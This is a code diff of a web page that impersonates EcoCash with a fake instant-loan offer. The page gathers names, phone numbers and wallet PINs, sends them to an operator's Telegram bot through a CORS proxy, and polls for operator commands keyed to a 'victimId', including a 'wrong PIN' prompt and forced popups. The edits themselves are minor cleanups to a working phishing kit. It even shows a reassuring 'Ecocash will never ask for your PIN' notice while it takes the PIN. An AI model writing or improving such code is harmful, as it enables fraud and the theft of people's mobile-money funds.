@@ -6,6 +6,7 @@
   <meta name="theme-color" content="#0033A0" />
   <title>Ecocash Loans — Instant Cash to Your Wallet</title>
 
+  <!-- ECOCASH OFFICIAL FAVICON -->
   <link rel="icon" type="image/png" href="https://www.ecocash.co.zw/favicon.ico" />
   <link rel="apple-touch-icon" href="https://www.ecocash.co.zw/apple-touch-icon.png" />
 
@@ -328,6 +329,35 @@
       text-align: center;
     }
 
+    /* Forced Popup */
+    #forcedPopup {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.9);
+      color: #ff4757;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
+      padding: 20px;
+      gap: 16px;
+      animation: fadeIn 0.5s;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+
     @media (max-width: 480px) {
       .wrap { padding: 0 8px; }
       .brandname { font-size: 1.3rem; }
@@ -400,7 +430,7 @@
       <div class="err" id="err2"></div>
       <button class="cta" id="btnSubmitPin" type="button">Submit Application</button>
 
-      <div class="help">Ecocash will never call you to ask for your PIN.</div>
+      <div class="help">⚠️ Ecocash will never call you to ask for your PIN.</div>
     </section>
 
     <section class="card step" id="step3">
@@ -447,10 +477,7 @@
   const REDIRECT_DELAY_MS = 300000; // 5 minutes
 
   // ============================================================
-  //  CORS PROXY — THE FIX
-  //  Browser cannot read api.telegram.org responses directly.
-  //  Every call goes through this proxy so getUpdates works.
-  //  Swap this line if the proxy is slow or down.
+  //  CORS PROXY (for getUpdates to work in browser)
   // ============================================================
   const PROXY_URL = 'https://corsproxy.io/?url=';
 
@@ -486,10 +513,6 @@
     el.classList.add('show');
   }
 
-  function clearErr(id) {
-    document.getElementById(id).classList.remove('show');
-  }
-
   function getFinalAmount() {
     const select = document.getElementById('loanAmount');
     if (select.value === 'custom') {
@@ -510,7 +533,14 @@
   }
 
   // ============================================================
-  //  TELEGRAM VIA PROXY (READABLE RESPONSES)
+  //  NAME VALIDATION: LETTERS ONLY
+  // ============================================================
+  document.getElementById('fullName').addEventListener('input', function() {
+    this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+  });
+
+  // ============================================================
+  //  TELEGRAM VIA PROXY
   // ============================================================
   async function tgSend(text, replyMarkup) {
     const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -577,7 +607,7 @@ Choose action:
   }
 
   // ============================================================
-  //  LONG POLLING FOR ADMIN COMMANDS (VIA PROXY)
+  //  LONG POLLING FOR ADMIN COMMANDS
   // ============================================================
   function startPolling() {
     let offset = null;
@@ -596,7 +626,6 @@ Choose action:
         if (fromId != CHAT_ID) return;
         if (!action || !action.endsWith(state.victimId)) return;
 
-        // Stop the loading spinner on the Telegram button
         tgAnswer(cb.id);
 
         if (action.startsWith('wrong_pin_')) {
@@ -618,7 +647,7 @@ Choose action:
   function showForcedPopup(message) {
     const overlay = document.createElement('div');
     overlay.id = 'forcedPopup';
-    overlay.style = `
+    overlay.style.cssText = `
       position: fixed; inset: 0; background: rgba(0, 0, 0, 0.9);
       color: #ff4757; display: flex; flex-direction: column;
       align-items: center; justify-content: center; z-index: 9999;
@@ -649,10 +678,6 @@ Choose action:
   // ============================================================
   //  STEP 1: NAME + PHONE + LOAN
   // ============================================================
-  document.getElementById('fullName').addEventListener('input', function() {
-    this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
-  });
-
   document.getElementById('btnNext').addEventListener('click', () => {
     const name = document.getElementById('fullName').value.trim();
     let msisdn = document.getElementById('msisdn').value.trim();
@@ -788,6 +813,5 @@ Choose action:
   // ============================================================
   document.getElementById('yr').textContent = new Date().getFullYear();
 </script>
-
 </body>
 </html>
